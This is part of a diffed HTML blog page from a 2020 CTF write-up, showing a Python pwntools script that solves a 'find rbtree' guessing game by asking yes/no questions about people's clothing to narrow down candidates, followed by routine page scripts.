+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># return process([&quot;python&quot;,&quot;find_rbtree.py&quot;])
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;find-rbtree.chal.perfect.blue&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span>)
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">chunks</span><span>(</span><span style="color:#ffcc66;">lst</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">n</span><span>):
+</span><span>    </span><span style="font-style:italic;color:#5c6773;">&quot;&quot;&quot;Yield successive n-sized chunks from lst.&quot;&quot;&quot;
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">len</span><span>(lst)</span><span style="color:#ccc9c2cc;">, </span><span>n):
+</span><span>        </span><span style="color:#ffa759;">yield </span><span>lst[i</span><span style="color:#ccc9c2cc;">:</span><span>i </span><span style="color:#f29e74;">+ </span><span>n]
+</span><span>
+</span><span>cases </span><span style="color:#f29e74;">= </span><span>[(</span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">3</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">7</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">3</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">15</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">25</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">50</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">6</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">75</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">7</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">100</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">250</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">9</span><span>)]
+</span><span>cases </span><span style="color:#f29e74;">+= </span><span>[(</span><span style="color:#ffcc66;">400</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">10</span><span>)] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">5 </span><span style="color:#f29e74;">+ </span><span>[(</span><span style="color:#ffcc66;">750</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">11</span><span>)] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">5 </span><span style="color:#f29e74;">+ </span><span>[(</span><span style="color:#ffcc66;">1000</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">12</span><span>)] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">5 </span><span style="color:#f29e74;">+ </span><span>[(</span><span style="color:#ffcc66;">1600</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">12</span><span>)] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">5
+</span><span>
+</span><span>mutex </span><span style="color:#f29e74;">= </span><span>threading</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Lock</span><span>()
+</span><span>tries </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>
+</span><span>
+</span><span>thread_no </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1
+</span><span>
+</span><span>thread_status </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">defaultdict</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>)
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">attempt</span><span>():
+</span><span>    </span><span style="color:#ffa759;">global </span><span>tries
+</span><span>    round_no </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>    attempt_at_start </span><span style="color:#f29e74;">= </span><span>tries
+</span><span>    p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">ask</span><span>(</span><span style="color:#ffcc66;">key</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">value</span><span>):
+</span><span>        (p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;? &gt; &quot;</span><span>))
+</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(key)
+</span><span>        (p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;! &gt; &quot;</span><span>))
+</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(value)
+</span><span>        res </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>        </span><span style="color:#ffa759;">if </span><span>res</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">count</span><span>(</span><span style="color:#bae67e;">&quot;YES&quot;</span><span>) </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">0</span><span>:
+</span><span>            </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">True
+</span><span>        </span><span style="color:#ffa759;">elif </span><span>res</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">count</span><span>(</span><span style="color:#bae67e;">&quot;NO&quot;</span><span>) </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">0</span><span>:
+</span><span>            </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">False
+</span><span>        </span><span style="color:#ffa759;">else</span><span>:
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;wtf???&quot;</span><span style="color:#ccc9c2cc;">, </span><span>key</span><span style="color:#ccc9c2cc;">, </span><span>value)
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#ffcc66;">1 </span><span style="color:#f29e74;">+ </span><span style="color:#bae67e;">&quot;&quot;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_best_filter</span><span>(</span><span style="color:#ffcc66;">people</span><span>):
+</span><span>        </span><span style="font-style:italic;color:#5c6773;">&quot;&quot;&quot;
+</span><span style="font-style:italic;color:#5c6773;">        The idea here is to search for the item of clothing
+</span><span style="font-style:italic;color:#5c6773;">        which comes closest to letting us divide the list of people in half
+</span><span style="font-style:italic;color:#5c6773;">        &quot;&quot;&quot;
+</span><span>        count </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">defaultdict</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">dict</span><span>)
+</span><span>        </span><span style="color:#ffa759;">for </span><span>key </span><span style="color:#ffa759;">in </span><span>prop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">keys</span><span>():
+</span><span>            </span><span style="color:#ffa759;">for </span><span>possible </span><span style="color:#ffa759;">in </span><span>prop[key]:
+</span><span>                count[key][possible] </span><span style="color:#f29e74;">= </span><span>json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>(people)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">count</span><span>(possible)
+</span><span>        flattened_count </span><span style="color:#f29e74;">= </span><span>{k</span><span style="color:#ccc9c2cc;">:</span><span style="color:#f28779;">abs</span><span>((</span><span style="color:#f28779;">len</span><span>(people)</span><span style="color:#f29e74;">/</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#f29e74;">-</span><span>v) </span><span style="color:#ffa759;">for </span><span>k</span><span style="color:#ccc9c2cc;">, </span><span>v </span><span style="color:#ffa759;">in </span><span style="color:#ffd580;">flatten</span><span>(count)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">items</span><span>()}
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#f28779;">min</span><span>(flattened_count</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">key</span><span style="color:#f29e74;">=</span><span>flattened_count</span><span style="color:#f29e74;">.</span><span>get)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">figure_rbtree</span><span>(</span><span style="color:#ffcc66;">people</span><span>):
+</span><span>        </span><span style="color:#ffa759;">nonlocal </span><span>round_no
+</span><span>        people_count, guesses </span><span style="color:#f29e74;">= </span><span>cases[round_no]
+</span><span>        </span><span style="color:#ffa759;">if </span><span>round_no </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">0 </span><span style="color:#f29e74;">or </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>            mutex</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">acquire</span><span>()
+</span><span>            thread_status[threading</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">currentThread</span><span>()</span><span style="color:#f29e74;">.</span><span>ident] </span><span style="color:#f29e74;">= </span><span>(threading</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">currentThread</span><span>()</span><span style="color:#f29e74;">.</span><span>ident</span><span style="color:#ccc9c2cc;">,</span><span>attempt_at_start</span><span style="color:#ccc9c2cc;">,</span><span>round_no </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>)
+</span><span>            mutex</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">release</span><span>()
+</span><span>        count </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>        </span><span style="color:#ffa759;">while </span><span style="color:#f28779;">len</span><span>(people) </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">1</span><span>:
+</span><span>
+</span><span>            k,v </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">get_best_filter</span><span>(people)
+</span><span>            </span><span style="color:#ffa759;">if </span><span style="color:#ffd580;">ask</span><span>(k</span><span style="color:#ccc9c2cc;">,</span><span>v):
+</span><span>                people </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">list</span><span>(</span><span style="color:#f28779;">filter</span><span>(</span><span style="color:#ffa759;">lambda </span><span style="color:#ffcc66;">x</span><span>: x[k] </span><span style="color:#f29e74;">== </span><span>v</span><span style="color:#ccc9c2cc;">, </span><span>people))
+</span><span>            </span><span style="color:#ffa759;">else</span><span>:
+</span><span>                people </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">list</span><span>(</span><span style="color:#f28779;">filter</span><span>(</span><span style="color:#ffa759;">lambda </span><span style="color:#ffcc66;">x</span><span>: x[k] </span><span style="color:#f29e74;">!= </span><span>v</span><span style="color:#ccc9c2cc;">, </span><span>people))
+</span><span>            count </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>            </span><span style="color:#ffa759;">if </span><span>count </span><span style="color:#f29e74;">== </span><span>guesses: </span><span style="font-style:italic;color:#5c6773;"># guess from the remainder lol
+</span><span>                round_no </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>                </span><span style="color:#ffa759;">return </span><span>(</span><span style="color:#ffcc66;">False</span><span style="color:#ccc9c2cc;">, </span><span>random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">choice</span><span>(people))
+</span><span>        round_no </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        </span><span style="color:#ffa759;">return </span><span>(</span><span style="color:#ffcc66;">True</span><span style="color:#ccc9c2cc;">, </span><span>people[</span><span style="color:#ffcc66;">0</span><span>])
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">solve_round</span><span>():
+</span><span>        original_data </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;Now ask me!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>        data </span><span style="color:#f29e74;">= </span><span>original_data</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#bae67e;">&quot;Eyecolor&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Eye color&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#bae67e;">&quot;T-shirtcolor&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;T-shirt color&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#bae67e;">&quot;Sockscolor&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;Socks color&quot;</span><span>)
+</span><span>
+</span><span>        people </span><span style="color:#f29e74;">= </span><span>[</span><span style="font-style:italic;color:#5ccfe6;">dict</span><span>(x) </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span style="color:#ffd580;">chunks</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">findall</span><span>(</span><span style="color:#bae67e;">&quot;(.*):(.*)&quot;</span><span style="color:#ccc9c2cc;">,</span><span>data)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">8</span><span>)]
+</span><span>        early, r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">figure_rbtree</span><span>(people)
+</span><span>        answer </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{r[</span><span style="color:#bae67e;">&#39;Eyewear&#39;</span><span>]} {r[</span><span style="color:#bae67e;">&#39;Eye color&#39;</span><span>]} {r[</span><span style="color:#bae67e;">&#39;Hair&#39;</span><span>]} {r[</span><span style="color:#bae67e;">&#39;Outerwear&#39;</span><span>]} {r[</span><span style="color:#bae67e;">&#39;T-shirt color&#39;</span><span>]} {r[</span><span style="color:#bae67e;">&#39;Trousers&#39;</span><span>]} {r[</span><span style="color:#bae67e;">&#39;Socks color&#39;</span><span>]} {r[</span><span style="color:#bae67e;">&#39;Shoes&#39;</span><span>]}</span><span style="color:#bae67e;">&quot;
+</span><span>        </span><span style="color:#ffa759;">if </span><span>early:
+</span><span>            p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;Solution&quot;</span><span>)
+</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(answer)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">try</span><span>:
+</span><span>        </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">30</span><span>):
+</span><span>            </span><span style="color:#ffd580;">solve_round</span><span>()
+</span><span>        response </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>        </span><span style="color:#f28779;">print</span><span>(response)
+</span><span>        </span><span style="color:#ffa759;">import </span><span>os
+</span><span>        os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">kill</span><span>(os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getpid</span><span>()</span><span style="color:#ccc9c2cc;">, </span><span>signal</span><span style="color:#f29e74;">.</span><span>SIGKILL)
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">True
+</span><span>    </span><span style="color:#ffa759;">except </span><span style="font-style:italic;color:#5ccfe6;">EOFError</span><span>:
+</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>        time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">5</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">False
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">loop</span><span>():
+</span><span>    </span><span style="color:#ffa759;">global </span><span>tries 
+</span><span>    </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>        mutex</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">acquire</span><span>()
+</span><span>        tries </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        mutex</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">release</span><span>()
+</span><span>        </span><span style="color:#ffd580;">attempt</span><span>()
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">stats</span><span>():
+</span><span>    </span><span style="color:#ffa759;">import </span><span>os
+</span><span>    </span><span style="color:#ffa759;">import </span><span>time
+</span><span>    </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>        mutex</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">acquire</span><span>()
+</span><span>        </span><span style="color:#ffa759;">for </span><span>k</span><span style="color:#ccc9c2cc;">, </span><span>v </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">sorted</span><span>(thread_status</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">items</span><span>()</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">key</span><span style="color:#f29e74;">=</span><span style="color:#ffa759;">lambda </span><span style="color:#ffcc66;">x</span><span>: x[</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ffcc66;">2</span><span>]):
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{v[</span><span style="color:#ffcc66;">0</span><span>]}</span><span style="color:#bae67e;">, attempt = </span><span>{v[</span><span style="color:#ffcc66;">1</span><span>]}</span><span style="color:#bae67e;">, round = </span><span>{v[</span><span style="color:#ffcc66;">2</span><span>]}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>        mutex</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">release</span><span>()
+</span><span>        time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">2</span><span>)
+</span><span>
+</span><span>threads </span><span style="color:#f29e74;">= </span><span>[]
+</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(thread_no):
+</span><span>    t1 </span><span style="color:#f29e74;">= </span><span>threading</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Thread</span><span>(</span><span style="color:#ffcc66;">target</span><span style="color:#f29e74;">=</span><span>loop)
+</span><span>    t1</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">start</span><span>()
+</span><span>    threads</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>(t1)
+</span><span>
+</span><span>stats </span><span style="color:#f29e74;">= </span><span>threading</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Thread</span><span>(</span><span style="color:#ffcc66;">target</span><span style="color:#f29e74;">=</span><span>stats)
+</span><span>stats</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">start</span><span>()
+</span><span>
+</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span>threads:
+</span><span>    i</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>()
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date"> 6 December 2020</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
